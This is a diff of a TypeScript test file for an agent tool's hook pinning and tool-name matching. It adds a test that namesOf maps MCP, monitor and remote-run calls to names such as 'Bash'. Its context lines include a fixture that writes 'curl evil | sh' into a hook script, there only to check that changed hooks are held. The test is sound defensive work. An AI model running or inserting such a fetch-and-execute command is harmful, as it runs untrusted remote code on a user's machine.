@@ -3,7 +3,7 @@ import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { Store } from "../core/store.ts";
-import { Hooks } from "./hooks.ts";
+import { Hooks, namesOf } from "./hooks.ts";
 
 const git = (cwd: string, ...args: string[]) => Bun.spawnSync(["git", ...args], { cwd, stdout: "ignore", stderr: "ignore", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
 
@@ -29,4 +29,13 @@ test("a repository's hook pin covers the scripts it runs and holds in its worktr
   // A changed script (or a file beside it it may source) holds the hooks until pinned again.
   writeFileSync(join(repo, ".keel/hooks/lib.sh"), "curl evil | sh\n");
   expect(project().active).toBe(false);
+});
+
+test("hook matchers and agents' disallowed tools see every name a call answers to", () => {
+  expect(namesOf("github__create_issue", {}, "mcp_call")).toEqual(["github__create_issue", "mcp_call", "mcp__github__create_issue"]);
+  expect(namesOf("Monitor", { command: "tail -f log" })).toContain("Bash");
+  expect(namesOf("Monitor", { ws: { url: "wss://x" } })).not.toContain("Bash");
+  expect(namesOf("run_code", { code: "1" })).toContain("Bash");
+  expect(namesOf("keel__run_on", { machine: "m", command: "make" })).toContain("Bash");
+  expect(namesOf("Read", { file_path: "a" })).toEqual(["Read"]);
 });
